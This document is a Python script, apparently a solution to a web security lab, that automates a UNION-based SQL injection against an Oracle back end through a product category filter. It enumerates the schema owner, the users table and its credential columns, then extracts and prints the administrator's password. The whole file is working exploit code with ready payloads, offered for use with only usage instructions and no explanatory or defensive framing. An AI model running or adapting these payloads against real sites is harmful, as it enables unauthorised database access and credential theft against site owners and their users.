# How to use:
# python filename.py https://websitename

# Created By    : Achmad
# Reference     : rkhal101

import logging
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def perform_request(url, sql_payload):
    path = "/filter?category=Gifts"
    # r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    r = requests.get(url + path + sql_payload, verify=False)
    return r.text


def sqli_users_owner(url):
    sql_payload = "' UNION SELECT 'THIS_USER-'||USER, NULL FROM DUAL -- 'SPACE'"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_owner = soup.find(text=re.compile('^THIS_USER-.*'))
    split_string = users_owner.split("-", 1)
    substring = split_string[1]
    users_owner = substring
    return users_owner


def sqli_users_table(url, users_owner):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables WHERE owner='%s' --" % users_owner
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USER.*'))
    return users_table


def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- " % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return username_column, password_column


def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" % (
        username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(
        text="administrator").parent.findNext('td').contents[0]
    return admin_password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for the users table...")

    users_owner = sqli_users_owner(url)
    if users_owner:
        print("Found the owner name: %s" % users_owner)
        users_table = sqli_users_table(url, users_owner)
        if users_table:
            print("Found the users table name: %s" % users_table)
            username_column, password_column = sqli_users_columns(
                url, users_table)
            if username_column and password_column:
                print("Found the username column name: %s " % username_column)
                print("Found the password column name: %s" % password_column)

                admin_password = sqli_administrator_cred(
                    url, users_table, username_column, password_column)
                if admin_password:
                    print("[+] The administrator password is: %s " %
                          admin_password)
                else:
                    print("Did not find the administrator password")
            else:
                print("Did not find the username and/or the password columns")
        else:
            print("Did not find a users table.")
    else:
        print("Did not find the owner.")
